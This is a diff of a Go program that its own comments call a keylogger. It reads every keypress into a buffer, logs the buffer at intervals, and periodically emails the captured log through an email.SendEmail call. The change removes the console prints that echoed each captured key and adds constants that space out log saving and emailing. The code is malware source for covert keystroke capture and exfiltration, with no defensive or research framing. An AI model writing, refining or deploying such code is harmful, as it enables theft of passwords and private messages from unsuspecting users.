@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"log"
 	"os"
 	"time"
@@ -11,7 +10,9 @@ import (
 )
 
 const (
-	delayKeyfetchMS = 5
+	delayKeyfetchMS     = 5
+	intervalToSaveLog   = 5000
+	intervalToSendEmail = 50000
 )
 
 var (
@@ -40,19 +41,17 @@ func main() {
 
 		//Check if a key is pressed
 		if !key.Empty {
-			fmt.Println(string(key.Rune) + " ")
-			fmt.Println(key.Rune)
 			text += string(key.Rune)
 		}
 
 		//A log is printed with the text written so far
-		if timer%1000 == 0 {
+		if timer%intervalToSaveLog == 0 {
 			log.Println(text)
 			text = ""
 		}
 
 		//An email is sent with the user's keylogger log
-		if timer%2000 == 0 {
+		if timer%intervalToSendEmail == 0 {
 			go email.SendEmail()
 		}
 
